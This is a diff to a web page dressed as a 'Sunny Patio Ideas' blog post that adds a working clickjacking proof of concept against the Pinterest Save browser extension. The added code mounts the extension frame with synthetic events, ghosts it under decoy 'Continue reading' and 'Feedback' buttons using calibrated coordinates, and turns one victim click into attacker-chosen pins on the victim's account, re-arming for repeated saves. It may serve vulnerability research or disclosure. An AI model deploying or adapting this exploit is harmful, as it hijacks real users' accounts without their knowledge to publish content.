@@ -4,19 +4,91 @@
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Sunny Patio Ideas &ndash; Weekend Market Finds</title>
+  <!-- ==================================================================
+       Pinterest "Save to Pinterest" extension UI-redress PoC  (v3)
+       Single-click pin creation on the victim's account — WARM and COLD.
+
+       WHAT THIS PAGE DOES (official extension installed & signed in):
+         1) Mounts the extension's Save frame using SYNTHETIC DOM events only
+            (no victim gesture needed for the mount).
+         2) Injects a page stylesheet moving the frame so the extension's real
+            controls sit ghosted (opacity .03) under visible decoys. The page
+            itself stays crisp.
+         3) ONE ordinary click on a decoy is delivered to the extension worker:
+            PUT https://api.pinterest.com/v3/pins/  ->  HTTP 200 / code 0.
+            Image, title, description, link all attacker-chosen; published on
+            the VICTIM'S account, silently.
+         4) After a write/dismiss closes the frame, the page re-arms; the next
+            click produces another pin (verified mass-save behaviour).
+
+       STATE MATRIX (verified 2026-10-01, extension 6.16.2, 1920x937):
+         WARM (extension remembers a last-saved board) — the default state of
+         any profile that has saved once before:
+             mount shows the compact save-picker; save-picker-save-button
+             centre frame-local (266,183) is translated to viewport (400,300)
+             under the "Continue reading" decoy => ONE click writes.
+         COLD (fresh profile; storage.boards empty AT PAGE LOAD; first mount):
+             mount shows the full board picker (sidebar). Top-choice board row
+             k centre is frame-local (1721, 220 + 48*k); with the SAME
+             packaged translate it sits at viewport (1855, 337 + 48*k),
+             under the right-edge "Feedback" decoy => ONE click on that row
+             writes immediately (row onTap -> PinCreate -> create fires; no
+             second click). Cold applies to the FIRST mount only — after the
+             picker mounts, the boards list is refilled and later mounts are
+             WARM. (So: if cold and the main decoy is clicked, it just
+             dismisses; the page re-arms and the next click on the main decoy
+             writes.)
+
+       HOSTING: any static host, PUBLIC HTTPS required (the save API rejects
+       private-IP source_url values). pin.png must be same-origin. No server
+       logic. Mount completes ~2.5-4.2 s after load; click after ~5 s. After a
+       write, wait ~5 s before clicking again (post-write unload window).
+
+       CALIBRATION (1920x937 verified; deviations none):
+         DECOY_CENTER (400,300)  == warm save-button centre.
+         COLD_ROW0    (1855,337) == cold top-choice row 0 (rows +48px below).
+         Both derive from the one packaged translate3d(134px,117px,0) on the
+         full-viewport frame; if the picker layout changes (extension
+         version), re-measure the two frame-local rects and update here.
+
+       NOT zero-gesture: the victim's genuine click is required; everything
+       before it is automatic.
+       ================================================================== -->
   <meta property="og:title" content="Garden bench inspiration for small patios">
   <meta property="og:description" content="A quick round-up of reader photos.">
   <meta property="og:image" content="pin.png">
   <style>
-    #wh-decoy {
+    /* Only the decoys are styled; the flow layout above them is deliberately
+       left at browser defaults to keep the calibration identical to the
+       verified run. Decoys are pointer-events:none so the hit-test falls
+       through to the ghosted frame underneath. */
+    #wh-decoy {                      /* WARM decoy: sits over the Save control */
       position: fixed; left: 270px; top: 265px; width: 260px; height: 70px;
-      pointer-events: none;              /* hit-test falls through to the frame */
+      pointer-events: none;
       z-index: 1000;
       display: flex; align-items: center; justify-content: center;
       background: #e60023; color: #fff; border-radius: 999px;
       font: 600 18px/1 system-ui, sans-serif; letter-spacing: .2px;
       box-shadow: 0 6px 18px rgba(0,0,0,.25);
     }
+    #wh-decoy-cold {                 /* COLD decoy: right-edge tab over row 0 */
+      position: fixed; left: 1819px; top: 315px; width: 72px; height: 44px;
+      pointer-events: none;
+      z-index: 1000;
+      display: flex; align-items: center; justify-content: center;
+      background: #444; color: #eee; border-radius: 8px 0 0 8px;
+      font: 600 13px/1 system-ui, sans-serif;
+      box-shadow: 0 4px 12px rgba(0,0,0,.3);
+    }
+    /* Optional cosmetic (disabled by default; leave off to keep the verified
+       chain untouched):
+    [data-test-id="pinterest-save-button"] { opacity: .03 !important; }
+    */
+    /* The redress rule is injected at runtime (see script bottom):
+       iframe[src*="chrome-extension"] {
+         transform: translate3d(134px,117px,0) !important;
+         filter: opacity(0.03) !important;
+       } */
   </style>
 </head>
 <body>
@@ -28,16 +100,24 @@
        title="Garden bench inspiration for small patios">
   <p>Thanks for reading.</p>
   <button id="wh-decoy" type="button" tabindex="-1">Continue reading &rarr;</button>
+  <button id="wh-decoy-cold" type="button" tabindex="-1">Feedback</button>
   <script>
   (() => {
     "use strict";
-    /* CONFIG: verified run 2026-10-01, extension 6.16.2, 1920x937 viewport.
-       Recalibrate SAVE_BUTTON_CENTER from the frame's save-picker-save-button
-       rect if the picker lands elsewhere. */
-    const DECOY_CENTER       = { x: 400, y: 300 }; // center of #wh-decoy
-    const SAVE_BUTTON_CENTER = { x: 266, y: 183 }; // save-picker-save-button center, frame-local
+
+    /* ------------------------- CONFIG ------------------------- */
+    const DECOY_CENTER       = { x: 400, y: 300 }; // #wh-decoy centre (warm: save control)
+    const SAVE_BUTTON_CENTER = { x: 266, y: 183 }; // save-picker-save-button centre, frame-local (warm)
+    /* cold-state reference (first mount only): top-choice row 0 centre,
+       frame-local (1721,220) -> viewport (1855,337) with the same translate;
+       lower rows are +48 px each. #wh-decoy-cold covers row 0. */
+    /* ---------------------------------------------------------- */
     const DX = DECOY_CENTER.x - SAVE_BUTTON_CENTER.x; // 134
     const DY = DECOY_CENTER.y - SAVE_BUTTON_CENTER.y; // 117
+    const MAX_REPRIMES = 50;
+
+    const state = window.__POC = { events: [], sawFrame: false, reprimes: 0 };
+    const log = (...a) => state.events.push([Date.now(), ...a]);
 
     function injectRedressSheet() {
       if (document.getElementById("wh-sheet")) return;
@@ -46,6 +126,16 @@
       s.textContent =
         'iframe[src*="chrome-extension"]{ transform: translate3d(' + DX + 'px,' + DY + 'px,0) !important; filter: opacity(0.03) !important; }';
       (document.head || document.documentElement).appendChild(s);
+      log("redress-sheet-injected", s.textContent);
+    }
+
+    const findFrame = () => document.querySelector('iframe[src*="chrome-extension"]');
+
+    async function loadImage() {
+      const img = document.getElementById("target-img");
+      if (img.complete && img.naturalWidth > 0) return;
+      await new Promise(r => { img.onload = r; img.onerror = r; setTimeout(r, 5000); });
+      log("image", { complete: img.complete, natural: img.naturalWidth });
     }
 
     async function prime() {
@@ -54,29 +144,54 @@
       img.dispatchEvent(new MouseEvent("mouseover", { bubbles: true, cancelable: true, clientX: 60, clientY: 140 }));
       await new Promise(r => setTimeout(r, 1200));
       const btn = document.querySelector('[data-test-id="pinterest-save-button"]');
-      if (!btn) return;
-      // 2) synthetic hover (fallback click) on the Save button -> frame mounts full-viewport
+      log("img-hover", { saveButton: !!btn });
+      if (!btn) return false;
+      // 2) synthetic hover (fallback: click) on the Save button -> frame mounts full-viewport
       btn.dispatchEvent(new MouseEvent("mouseover", { bubbles: true, cancelable: true }));
       await new Promise(r => setTimeout(r, 1500));
-      let frame = document.querySelector('iframe[src*="chrome-extension"]');
+      let frame = findFrame();
       if (!frame) {
         btn.click();
         await new Promise(r => setTimeout(r, 5000));
-        frame = document.querySelector('iframe[src*="chrome-extension"]');
+        frame = findFrame();
       }
-      if (frame) injectRedressSheet();
+      log("mount", { frame: !!frame, src: frame ? frame.src : null });
+      if (frame) { state.sawFrame = true; injectRedressSheet(); }
+      return !!frame;
     }
 
-    // Late-mount safety net.
+    async function primeWithRetries() {
+      await loadImage();
+      for (let i = 0; i < 4; i++) {
+        if (await prime()) return;
+        await new Promise(r => setTimeout(r, 1500));
+      }
+      log("prime-exhausted");
+    }
+
+    // Watchdog: inject the sheet on late mounts; re-arm after a write/dismiss.
+    let reprimeCooldown = false;
     const iv = setInterval(() => {
-      if (document.querySelector('iframe[src*="chrome-extension"]')) injectRedressSheet();
+      const frame = findFrame();
+      if (frame) { state.sawFrame = true; injectRedressSheet(); return; }
+      if (state.sawFrame && !reprimeCooldown && state.reprimes < MAX_REPRIMES) {
+        reprimeCooldown = true;
+        state.reprimes++;
+        log("re-arm", state.reprimes);
+        setTimeout(() => { primeWithRetries().finally(() => { reprimeCooldown = false; }); }, 1200);
+      }
     }, 500);
-    setTimeout(() => clearInterval(iv), 30000);
+
+    // Diagnostics: record clicks and the immediate frame state after each.
+    document.addEventListener("click", (e) => {
+      log("click", { x: e.clientX, y: e.clientY, trusted: e.isTrusted, frame: !!findFrame() });
+      setTimeout(() => log("post-click-frame", { frame: !!findFrame() }), 1500);
+    }, true);
 
     if (document.readyState === "loading") {
-      document.addEventListener("DOMContentLoaded", () => setTimeout(prime, 800));
+      document.addEventListener("DOMContentLoaded", () => setTimeout(primeWithRetries, 800));
     } else {
-      setTimeout(prime, 800);
+      setTimeout(primeWithRetries, 800);
     }
   })();
   </script>
